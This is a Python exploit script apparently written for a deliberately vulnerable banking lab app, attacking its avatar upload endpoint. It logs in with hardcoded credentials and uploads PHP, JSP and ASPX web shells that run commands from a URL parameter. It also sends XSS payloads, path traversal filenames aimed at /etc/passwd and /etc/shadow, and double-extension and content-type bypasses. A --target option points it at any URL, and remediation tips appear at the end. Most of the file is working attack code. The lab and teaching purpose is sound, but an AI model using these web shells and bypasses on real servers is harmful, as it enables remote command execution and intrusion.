#!/usr/bin/env python3
"""
File Upload Vulnerability Exploit - Vulnerable Bank
===================================================
This script demonstrates file upload vulnerabilities.

CVSS Score: 9.8 (Critical)
CWE: CWE-434
"""

import requests
import sys
import os

# Target configuration
TARGET_URL = "http://localhost:8080"
LOGIN_ENDPOINT = f"{TARGET_URL}/login"
UPLOAD_ENDPOINT = f"{TARGET_URL}/upload_avatar"

# Attack configuration
USERNAME = "john"
PASSWORD = "password"

def print_banner():
    print("=" * 60)
    print("File Upload Vulnerability Exploit - Vulnerable Bank")
    print("=" * 60)
    print()

def login(session):
    """Login and return session"""
    data = {
        'username': USERNAME,
        'password': PASSWORD
    }

    response = session.post(LOGIN_ENDPOINT, data=data)
    return response.status_code == 200

def upload_file(session, filename, content, content_type="image/jpeg"):
    """Upload a file"""
    files = {
        'file': (filename, content, content_type)
    }

    try:
        response = session.post(UPLOAD_ENDPOINT, files=files)
        return response
    except Exception as e:
        print(f"[!] Upload error: {e}")
        return None

def test_malicious_extensions():
    """Test 1: Upload files with malicious extensions"""
    print("[*] Test 1: Malicious File Extensions")
    print("[*] Attempting to upload dangerous file types...\n")

    session = requests.Session()

    if not login(session):
        print("[-] Login failed!")
        return

    print("[+] Login successful!")

    # Test different malicious file types
    test_files = [
        ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
        ("shell.sh", "#!/bin/bash\nwhoami", "application/x-sh"),
        ("webshell.aspx", "<%@ Page Language=\"C#\" %>", "text/plain"),
        ("exploit.svg", "<svg onload=alert(1)>", "image/svg+xml"),
        ("test.html", "<html><script>alert('XSS')</script></html>", "text/html"),
    ]

    successful_uploads = []

    for filename, content, content_type in test_files:
        print(f"[*] Uploading: {filename}")

        response = upload_file(session, filename, content, content_type)

        if response and response.status_code == 200:
            try:
                data = response.json()
                if data.get('success'):
                    print(f"[+] SUCCESS! Uploaded {filename}")
                    print(f"    Path: {data.get('path')}")
                    successful_uploads.append((filename, data.get('path')))
                else:
                    print(f"[-] Failed: {data.get('error')}")
            except:
                print(f"[!] Unexpected response for {filename}")
        else:
            print(f"[-] Upload failed for {filename}")

        print()

    if successful_uploads:
        print("\n[+] Successfully uploaded malicious files:")
        for filename, path in successful_uploads:
            print(f"    - {filename} -> {path}")
            print(f"      Try accessing: {TARGET_URL}{path}")

def test_path_traversal():
    """Test 2: Path traversal in filename"""
    print("\n[*] Test 2: Path Traversal in Filename")
    print("[*] Attempting directory traversal...\n")

    session = requests.Session()

    if not login(session):
        print("[-] Login failed!")
        return

    # Test path traversal in filenames
    traversal_files = [
        ("../../etc/passwd.jpg", "fake image content"),
        ("../../../tmp/exploit.jpg", "fake image content"),
        ("....//....//....//etc/shadow.jpg", "fake image content"),
    ]

    for filename, content in traversal_files:
        print(f"[*] Uploading: {filename}")

        response = upload_file(session, filename, content)

        if response and response.status_code == 200:
            try:
                data = response.json()
                if data.get('success'):
                    print(f"[+] Path traversal successful!")
                    print(f"    Saved to: {data.get('path')}")
                else:
                    print(f"[-] Blocked: {data.get('error')}")
            except:
                print(f"[!] Unexpected response")
        else:
            print(f"[-] Upload failed")

        print()

def test_double_extension():
    """Test 3: Double extension bypass"""
    print("\n[*] Test 3: Double Extension Bypass")
    print("[*] Attempting double extension technique...\n")

    session = requests.Session()

    if not login(session):
        print("[-] Login failed!")
        return

    # Test double extensions
    double_ext_files = [
        ("shell.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("exploit.jsp.png", "<% Runtime.getRuntime().exec(\"whoami\"); %>", "image/png"),
        ("test.html.gif", "<script>alert(1)</script>", "image/gif"),
    ]

    for filename, content, content_type in double_ext_files:
        print(f"[*] Uploading: {filename}")

        response = upload_file(session, filename, content, content_type)

        if response and response.status_code == 200:
            try:
                data = response.json()
                if data.get('success'):
                    print(f"[+] Upload successful!")
                    print(f"    Path: {data.get('path')}")
                else:
                    print(f"[-] Failed: {data.get('error')}")
            except:
                print(f"[!] Unexpected response")
        else:
            print(f"[-] Upload failed")

        print()

def test_content_type_bypass():
    """Test 4: Content-Type bypass"""
    print("\n[*] Test 4: Content-Type Bypass")
    print("[*] Uploading PHP shell with image Content-Type...\n")

    session = requests.Session()

    if not login(session):
        print("[-] Login failed!")
        return

    # Upload malicious PHP but claim it's an image
    filename = "legitimate_looking_image.jpg"
    content = "<?php\n// Malicious PHP code\nif (isset($_GET['cmd'])) {\n    echo '<pre>';\n    system($_GET['cmd']);\n    echo '</pre>';\n}\n?>"

    print(f"[*] Uploading: {filename}")
    print(f"[*] Content-Type: image/jpeg")
    print(f"[*] Actual content: PHP web shell")

    response = upload_file(session, filename, content, "image/jpeg")

    if response and response.status_code == 200:
        try:
            data = response.json()
            if data.get('success'):
                print(f"\n[+] SUCCESS! Content-Type bypass worked!")
                print(f"[+] File uploaded as: {data.get('path')}")
                print(f"\n[!] The server accepted a PHP file disguised as JPEG!")
            else:
                print(f"[-] Upload blocked: {data.get('error')}")
        except:
            print(f"[!] Unexpected response")
    else:
        print(f"[-] Upload failed")

def main():
    print_banner()

    if len(sys.argv) > 1 and sys.argv[1] == '--target':
        global TARGET_URL, LOGIN_ENDPOINT, UPLOAD_ENDPOINT
        TARGET_URL = sys.argv[2]
        LOGIN_ENDPOINT = f"{TARGET_URL}/login"
        UPLOAD_ENDPOINT = f"{TARGET_URL}/upload_avatar"

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Username: {USERNAME}")
    print()

    # Run all tests
    test_malicious_extensions()
    test_path_traversal()
    test_double_extension()
    test_content_type_bypass()

    print("\n" + "=" * 60)
    print("[*] All tests completed!")
    print("=" * 60)
    print("\n[!] Remediation:")
    print("  1. Validate file extensions against whitelist")
    print("  2. Check file content (magic bytes), not just extension")
    print("  3. Sanitize filenames (remove special characters, traversal attempts)")
    print("  4. Use random filenames for uploaded files")
    print("  5. Store uploads outside webroot")
    print("  6. Implement file size limits")
    print("  7. Scan uploads with antivirus")
    print("  8. Disable script execution in upload directory")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
